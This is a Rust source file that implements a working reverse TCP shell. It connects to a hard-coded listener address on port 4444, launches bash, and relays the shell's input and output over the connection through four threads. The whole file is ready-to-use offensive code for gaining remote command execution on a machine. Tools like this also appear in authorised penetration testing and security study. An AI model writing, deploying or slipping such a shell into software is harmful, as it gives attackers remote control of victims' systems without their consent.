///
/// Opens a TCP connection to the configured server and runs a command.
/// In/output from the executed command is redirected from/to the established connection.
/// This is useful for creating a reverse_tcp shell.
/// 
/// Author: Gavyn Riebau
/// https://github.com/gavynriebau

#[macro_use]
extern crate log;
extern crate env_logger;

use std::net::*;
use std::process::*;
use std::io::*;
use std::thread;
use std::sync::mpsc;
use std::sync::mpsc::*;

const LHOST : &str = "192.168.86.147";
const LPORT : &str = "4444";
const SHELL_TYPE : &str = "bash";

fn main() {
    env_logger::init();
    debug!("Starting...");

    let remote_server = format!("{}:{}", LHOST, LPORT);

    debug!("Connecting to '{}'", remote_server);
    let mut stream = TcpStream::connect(remote_server).expect("Failed to connect to server");
    let mut cloned_stream = stream.try_clone().expect("Failed to clone TCP stream");

    debug!("Connected to endpoint, starting shell");
    let shell_child = Command::new(SHELL_TYPE)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("Failed to run command");

    debug!("Opening shell io");
    let mut bash_out = shell_child.stdout.expect("Failed to open command stdout");
    let mut bash_in = shell_child.stdin.expect("Failed to open command stdin");

    let (net_tx, net_rx) : (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();
    let (shell_tx, shell_rx) : (Sender<Vec<u8>>, Receiver<Vec<u8>>) = mpsc::channel();

    debug!("Started shell, beginning io loops");

    let thread_net_read = thread::spawn(move || {
        let mut buffer : [u8; 512] = [0; 512];

        loop {
            let count = stream.read(&mut buffer).unwrap();

            if count > 0 {
                debug!("'{}' NETWORK to NET_TX", count);
                net_tx.send(Vec::from(&buffer[0..count])).unwrap();
            }

            stream.take_error().unwrap();
        }
    });

    let thread_net_write = thread::spawn(move || {
        loop {
            let data = shell_rx.recv().unwrap();
            debug!("'{}' SHELL_RX to NETWORK", data.len());

            cloned_stream.write(data.as_slice()).unwrap();
            cloned_stream.take_error().unwrap();
        }
    });

    let thread_shell_read = thread::spawn(move || {
        let mut buffer : [u8; 512] = [0; 512];

        loop {
            let count = bash_out.read(&mut buffer).unwrap();
            
            if count > 0 {
                debug!("'{}' SHELL to SHELL_TX", count);
                shell_tx.send(Vec::from(&buffer[0..count])).unwrap();
            }
        }
    });

    let thread_shell_write = thread::spawn(move || {
        loop {
            let data = net_rx.recv().unwrap();
            debug!("'{}' NET_RX to SHELL", data.len());
            bash_in.write(data.as_slice()).unwrap();
        }
    });

    debug!("Waiting for threads to finish.");
    thread_net_read.join().unwrap();
    thread_net_write.join().unwrap();
    thread_shell_read.join().unwrap();
    thread_shell_write.join().unwrap();
}
